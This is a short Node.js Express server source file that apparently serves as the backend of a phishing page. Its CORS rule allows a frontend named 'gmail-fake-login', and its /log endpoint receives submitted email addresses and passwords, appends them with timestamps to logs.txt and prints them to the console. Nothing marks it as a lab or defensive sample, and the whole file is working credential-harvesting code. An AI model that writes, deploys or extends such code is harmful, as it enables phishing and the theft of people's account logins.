const express = require('express');
const fs = require('fs');
const cors = require('cors'); // Add this line
const app = express();

// Allow requests from your frontend
app.use(cors({
    origin: 'https://gmail-fake-login.onrender.com' // Your frontend URL
}));

app.use(express.json());

app.post('/log', function(req, res) {
    const email = req.body.email;
    const password = req.body.password;
    const log = "Email: " + email + ", Password: " + password + ", Time: " + new Date() + "\n";

    fs.appendFile('logs.txt', log, function(err) {
        if (err) console.log("Error saving!");
    });

    console.log(log);
    res.send('Done');
});

// Use the port Render provides, or default to 3000 for local testing
const port = process.env.PORT || 3000;
app.listen(port, '0.0.0.0', function() {
    console.log("Server started on port " + port);
});